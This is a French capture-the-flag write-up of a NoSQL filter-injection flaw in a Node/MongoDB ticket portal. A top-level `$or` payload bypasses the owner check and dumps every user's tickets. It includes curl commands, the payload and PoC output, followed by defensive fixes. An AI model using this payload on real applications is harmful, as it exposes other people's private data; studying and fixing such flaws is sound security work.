# TicketVault — injection dans un filtre NoSQL → broken access control

- **Auteur :** lyons
- **Cible :** `http://<HOST>:<PORT>` (portail interne de support Node.js/Express + MongoDB + express-session)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (cf. la règle de non-persistance des flags)
- **Fichiers fournis :** `server.js`, `package.json` (les modules `db.js`, `utils/sanitize.js` et `utils/ticketFilter.js` ne sont **pas** inclus — leur fonctionnement a été déduit puis validé face au service en ligne)

## Scénario

Chaque compte peut s'inscrire, se connecter, ouvrir des tickets (sujet / contenu) et ne doit
accéder qu'à **ses propres tickets**. L'indice signale qu'un ticket de l'`admin` renferme le
flag et renvoie vers la route listant les tickets ainsi que la logique de contrôle d'accès.

## Repérage

Deux routes gèrent l'affichage des tickets dans `server.js` :

```js
app.get('/tickets', requireAuth, async (req, res) => {
  const db = getDb();
  const tickets = await db.collection('tickets')
    .find({ owner: req.session.username }).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: '' });
});

app.get('/tickets/search', requireAuth, async (req, res) => {
  const db = getDb();
  const filter = buildScopedFilter(req);          // utils/ticketFilter.js (non fourni)
  const tickets = await db.collection('tickets').find(filter).toArray();
  res.render('tickets', { tickets, username: req.session.username, q: req.query.q || '' });
});
```

- `/tickets` impose en dur `{ owner: req.session.username }` → route **sûre**.
- `/tickets/search` abandonne toute la fabrication du filtre à `buildScopedFilter(req)`, qui
  est censé garantir `owner == <utilisateur courant>` alors que son code n'est pas livré.

Sur la page `/tickets`, un champ « Advanced filter (JSON, power users) » est relié au
paramètre `filter` :

```html
<form method="GET" action="/tickets/search">
  <input type="text" name="q" placeholder="Search subject...">
  <details>
    <summary>Advanced filter (JSON, power users)</summary>
    <input type="text" name="filter" placeholder='{"subject": "printer"}'>
  </details>
  <button type="submit">Search</button>
</form>
```

Schéma typique d'**injection de filtre NoSQL** : le serveur prend un objet de requête
MongoDB brut venu du client puis essaye de le « scoper » sur l'utilisateur connecté.

## La faille

Le comportement a été cartographié en boîte noire au moyen de deux comptes de test, détenant
chacun un ticket au nom bien distinctif :

- `filter={"owner":"<autre_user>"}` → **aucun changement** : la réponse ne contient que le
  ticket de l'appelant. Une clé `owner` de premier niveau issue de l'attaquant se voit donc
  remplacée par le scope imposé (typiquement `{ ...parsedFilter, owner: session.username }`).
- `filter` transportant un **opérateur MongoDB de premier niveau** (`$or`) → **le scope saute** :

  ```
  GET /tickets/search?filter={"$or":[{"owner":"<autre_user>"},{"owner":"<moi>"}]}
  ```

  renvoie les tickets des **deux** comptes. Aussitôt qu'une clé préfixée `$` se présente au
  premier niveau, `buildScopedFilter` ne maintient plus `owner == session.username` comme
  contrainte ET-ée — son « sanitizer » repère la clé `$` et emprunte une voie de repli non
  sûre (le scope est court-circuité plutôt que de rejeter la requête ou de la combiner
  proprement via `$and`).

Résultat : **n'importe quel utilisateur authentifié accède à la totalité de la collection
`tickets`**, admin y compris, grâce à un filtre toujours vrai :

```
GET /tickets/search?filter={"$or":[{"owner":{"$exists":true}}]}
```

Un IDOR / broken access control d'école, né de la confiance faite à un objet de requête
MongoDB livré par l'utilisateur, sans verrouiller la contrainte de propriété comme un ET de
premier niveau impossible à contourner.

## Mise en pratique

1. Créer un compte jetable (`requireAuth` se contente de contrôler la présence de
   `req.session.username`, aucun privilège n'est exigé).
2. Requêter `/tickets/search` avec un `filter` dont la clause `$or` de premier niveau attrape
   tous les documents.
3. Au sein du HTML renvoyé, repérer le ticket dont `owner` égale exactement `admin`.

```bash
# 1. Enregistrement
curl -s -c ck.txt -X POST http://<HOST>:<PORT>/register \
  -d "username=exploit_user&password=pass123"

# 2. Dump de tous les tickets via le bypass de scope $or
curl -s -G -b ck.txt "http://<HOST>:<PORT>/tickets/search" \
  --data-urlencode 'filter={"$or":[{"owner":{"$exists":true}}]}' \
  -o alltickets.html

# 3. Extraction du ticket de l'admin
grep -i -B2 -A2 'owner: admin<' alltickets.html
```

PoC automatisé (`exploit.py`, lancé avec `python3 -I`) :

```
$ python3 -I exploit.py http://<HOST>:<PORT>
[+] Registered/logged in as exploit_<rand>
[+] GET /tickets/search?filter={"$or":[{"owner":{"$exists":true}}]}
[!] Ticket de l'admin :
    subject: Root cause analysis - incident 2024-03
    content: Postmortem notes ... Access recovery token: CTF{REDACTED}

[FLAG] CTF{REDACTED}
```

### Chausse-trapes : les tickets leurres

Le dump regorge de tickets « canari » semés par d'autres participants (owners du genre
`admin123`, `adminka`, `falsifier_...`, `audit_t0021_reviewer`) qui transportent de faux
flags (p. ex. `CTF{deadbeefcafebabe0123456789abcdef}`,
`CTF{audit_canary_0000_deadbeef}`), certains mentionnant « should only count if owner is us ».
Pour les écarter, on impose que le champ `owner` vaille **littéralement** la chaîne `admin` :
un unique ticket remplit ce critère, et son contenu recèle le vrai flag.

## Résultat obtenu

Le flag provient du ticket « Root cause analysis - incident 2024-03 » (`owner: admin`).
La valeur authentique n'est **pas persistée** ici, conformément à la règle de protection des
flags :

```
CTF{REDACTED}
```

## Origine du problème

`GET /tickets/search` pousse un filtre MongoDB JSON intégralement dicté par l'attaquant
jusqu'à `db.collection('tickets').find(filter)`, après une tentative de « scoping » qui ne
résiste pas aux clés opérateur de premier niveau (`$or`, sans doute également `$and`,
`$nor`…). La contrainte de propriété peut être retirée : un « cherche mes tickets » devient
alors la lecture de la collection entière.

## Recommandations défensives

- **Ne jamais remettre à un driver de base un objet filtre venu de l'utilisateur**, même
  « pour power users ». Pour permettre une recherche flexible, se limiter à des
  champs/opérateurs en liste blanche (p. ex. `subject: {$regex}`) et fabriquer la requête
  côté serveur.
- Lorsqu'un filtre utilisateur doit être fusionné avec le scope, il faut rendre la contrainte
  de propriété **impossible à contourner et à recombiner** :

  ```js
  const userFilter = sanitize(parsedFilter); // retire les clés $ de premier niveau
  const scoped = { $and: [{ owner: req.session.username }, userFilter] };
  ```

  et rejeter/éliminer toute clé préfixée `$` au lieu de neutraliser silencieusement le scope
  dès qu'une est repérée.
- Prévoir des tests garantissant que `/tickets/search` ne rend jamais un document où
  `owner != session.username`, charges adverses `$or` / `$where` / `$exists` comprises.
